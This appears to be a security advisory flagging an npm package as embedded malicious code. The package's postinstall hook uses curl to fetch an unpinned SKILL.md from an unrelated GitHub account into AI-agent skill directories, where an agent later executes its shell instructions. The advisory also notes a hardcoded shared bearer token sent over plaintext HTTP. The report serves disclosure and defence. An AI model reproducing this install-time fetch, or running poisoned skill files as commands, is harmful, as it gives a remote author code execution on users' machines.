summary: postinstall fetches mutable remote skill file from unrelated GitHub account into AI-agent command directory
details: On `npm install`, the package's postinstall hook runs `node bin/huoke.js install-skill`, which shells out to `curl -fsSL https://raw.githubusercontent.com/amswf/huoke/main/SKILL.md` and writes the response into `~/.hermes/skills/social-platform/huoke/SKILL.md` (and an OpenClaw equivalent). The fetch is from a personal GitHub user (`amswf`) not declared as the package publisher, targets the mutable `main` branch with no commit pin or hash verification, and the fetched file is staged into an AI-agent skills directory where its contents are interpreted as executable shell commands when the user later invokes the `/huoke` skill in their agent. The author can change `amswf/huoke@main/SKILL.md` at any time to inject new shell instructions that the installer's local AI agent will execute against the installer's machine. Separately, the CLI's runtime traffic defaults to plaintext `http://huoke.link` with a hardcoded shared bearer token (`sk_clawx_dev_2026`); this is a hygiene concern at user invocation, not the basis for the block.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
